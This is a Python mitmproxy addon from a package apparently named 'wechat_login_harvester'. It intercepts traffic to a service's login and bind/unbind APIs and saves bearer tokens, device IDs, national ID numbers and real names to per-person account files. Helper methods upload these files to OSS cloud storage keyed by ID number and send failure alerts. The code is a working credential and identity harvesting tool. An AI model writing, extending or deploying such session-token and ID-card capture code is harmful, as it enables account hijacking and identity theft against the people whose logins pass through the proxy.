from __future__ import annotations

import base64
import json
import logging
import os
import tempfile
from datetime import datetime
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class CapturedToken:
    def __init__(
        self,
        *,
        token: str,
        source_url: str,
        payload: dict[str, Any],
    ) -> None:
        self.token = token
        self.source_url = source_url
        self.payload = payload


class LoginCaptureAddon:
    auth_url_markers = (
        "/index.php/api/user/unbind",
        "/index.php/api/user/bind",
    )

    def __init__(
        self,
        *,
        login_url_marker: str,
        token_output_dir: Path,
        account_dir: Path,
        oss_client: OssClient | None = None,
        notifier: WeChatNotifier | None = None,
    ) -> None:
        self.login_url_marker = login_url_marker
        self.token_output_dir = token_output_dir
        self.account_dir = account_dir
        self.oss_client = oss_client
        self.notifier = notifier

    def request(self, flow) -> None:  # type: ignore[no-untyped-def]
        if not self._is_relevant_auth_url(flow.request.pretty_url):
            return
        self._write_debug(
            {
                "stage": "request",
                "request_url": flow.request.pretty_url,
                "request_body": flow.request.get_text(),
            }
        )

    def response(self, flow) -> None:  # type: ignore[no-untyped-def]
        if not self._is_relevant_auth_url(flow.request.pretty_url):
            return
        try:
            payload = json.loads(flow.response.get_text())
        except (json.JSONDecodeError, ValueError):
            return

        self._write_debug(
            {
                "stage": "response",
                "request_url": flow.request.pretty_url,
                "request_body": flow.request.get_text(),
                "response": payload,
            }
        )
        self._log_auth_response(flow.request.pretty_url, payload)
        if self.login_url_marker not in flow.request.pretty_url:
            return
        login_data = _extract_login_data(payload)
        if not login_data.get("token"):
            return

        captured = CapturedToken(
            token=login_data["token"],
            source_url=flow.request.pretty_url,
            payload=login_data,
        )
        self._write_captured(captured)
        self._write_account_file(login_data)

    def _is_relevant_auth_url(self, url: str) -> bool:
        return self.login_url_marker in url or any(
            marker in url for marker in self.auth_url_markers
        )

    def _log_auth_response(self, url: str, payload: dict[str, Any]) -> None:
        if "/api/user/unbind" in url:
            logger.info("unbind 响应：code=%s msg=%s", payload.get("code"), payload.get("msg"))
        elif "/api/user/bind" in url:
            logger.info("bind 响应：code=%s msg=%s", payload.get("code"), payload.get("msg"))

    def _write_debug(self, payload: dict[str, Any]) -> None:
        self.token_output_dir.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%dT%H%M%S%f")
        path = self.token_output_dir / f"{timestamp}.debug.json"
        path.write_text(
            json.dumps(payload, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )

    def _write_captured(self, captured: CapturedToken) -> None:
        self.token_output_dir.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%dT%H%M%S%f")
        output_path = self.token_output_dir / f"{timestamp}.json"
        payload = {
            "token": captured.token,
            "source_url": captured.source_url,
            "payload": captured.payload,
        }
        output_path.write_text(
            json.dumps(payload, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )

    def _write_account_file(self, login_data: dict[str, Any]) -> None:
        id_card = login_data.get("idCard") or login_data.get("id_card")
        if not id_card:
            return
        self.account_dir.mkdir(parents=True, exist_ok=True)
        path = self.account_dir / f"{id_card}.account"
        account_payload = {
            "appId": login_data.get("appId", ""),
            "token": login_data.get("token", ""),
            "deviceId": login_data.get("deviceId", ""),
            "idCard": id_card,
            "name": login_data.get("name", ""),
            "tokenExpiresAt": _jwt_expiry(login_data.get("token", "")),
        }
        fd, temporary = tempfile.mkstemp(prefix=".account-", dir=path.parent)
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as stream:
                json.dump(account_payload, stream, ensure_ascii=False, indent=2)
            os.replace(temporary, path)
        finally:
            if os.path.exists(temporary):
                os.unlink(temporary)

    def _upload_account_file(self, path: Path, id_card: str) -> None:
        if self.oss_client is None:
            return
        key = f"hxacc/account/{id_card}/{path.name}"
        try:
            self.oss_client.upload_file(path, key)
        except Exception as exc:
            logger.exception("OSS 上传文件失败：%s", key)
            if self.notifier is not None:
                self.notifier.send_failure(
                    "微信登录采集 OSS 上传失败",
                    details={
                        "key": key,
                        "身份证": id_card,
                        "异常": f"{type(exc).__name__}: {exc}",
                    },
                )

    def _upload_account_manifest(
        self,
        login_data: dict[str, Any],
        id_card: str,
    ) -> None:
        if self.oss_client is None:
            return
        name = login_data.get("name", "")
        manifest = _build_account_manifest(name, id_card)
        key = f"hxacc/account/{id_card}/account.json"
        try:
            self.oss_client.upload_text(
                key,
                json.dumps(manifest, ensure_ascii=False),
            )
        except Exception as exc:
            logger.exception("OSS 上传失败：%s", key)
            if self.notifier is not None:
                self.notifier.send_failure(
                    "微信登录采集 OSS 上传失败",
                    details={
                        "key": key,
                        "姓名": name,
                        "身份证": id_card,
                        "异常": f"{type(exc).__name__}: {exc}",
                    },
                )


def _extract_token(payload: dict[str, Any]) -> str:
    data = payload.get("data") or {}
    if isinstance(data, dict):
        token = data.get("token")
        if isinstance(token, str) and token:
            return token

    token = payload.get("token")
    if isinstance(token, str) and token:
        return token

    return ""


def _extract_login_data(payload: dict[str, Any]) -> dict[str, str]:
    data = payload.get("data") or {}
    if not isinstance(data, dict):
        data = {}
    user_info = data.get("userInfo") or {}
    member_info = data.get("memberInfo") or {}
    if not isinstance(user_info, dict):
        user_info = {}
    if not isinstance(member_info, dict):
        member_info = {}

    return {
        "appId": str(
            member_info.get("appId")
            or data.get("appId")
            or payload.get("appId")
            or ""
        ),
        "token": str(data.get("token") or payload.get("token") or ""),
        "deviceId": str(
            member_info.get("deviceId")
            or data.get("deviceId")
            or payload.get("deviceId")
            or ""
        ),
        "idCard": str(
            user_info.get("u_card")
            or member_info.get("idcard")
            or data.get("idCard")
            or data.get("id_card")
            or payload.get("idCard")
            or payload.get("id_card")
            or ""
        ),
        "name": str(
            user_info.get("u_name")
            or member_info.get("realname")
            or data.get("name")
            or payload.get("name")
            or ""
        ),
    }


def _jwt_expiry(token: str) -> int | None:
    try:
        segment = token.split(".")[1]
        segment += "=" * ((4 - len(segment) % 4) % 4)
        claims = json.loads(base64.urlsafe_b64decode(segment))
        exp = claims.get("exp")
        return int(exp) if isinstance(exp, (int, float)) else None
    except Exception:
        return None


def _build_account_manifest(name: str, id_card: str) -> dict[str, str]:
    return {"username": name, "id_card": id_card}


def _build_addons():
    from wechat_login_harvester.config import load_config

    _configure_capture_logging()
    config = load_config()
    return [
        LoginCaptureAddon(
            login_url_marker=config.login_url_marker,
            token_output_dir=config.token_output_dir,
            account_dir=config.account_dir,
        )
    ]


def _configure_capture_logging() -> None:
    package_logger = logging.getLogger("wechat_login_harvester")
    package_logger.setLevel(logging.INFO)
    if not package_logger.handlers:
        handler = logging.StreamHandler()
        handler.setFormatter(
            logging.Formatter("%(asctime)s %(levelname)s %(name)s %(message)s")
        )
        package_logger.addHandler(handler)


try:
    addons = _build_addons()
except Exception:
    addons = []
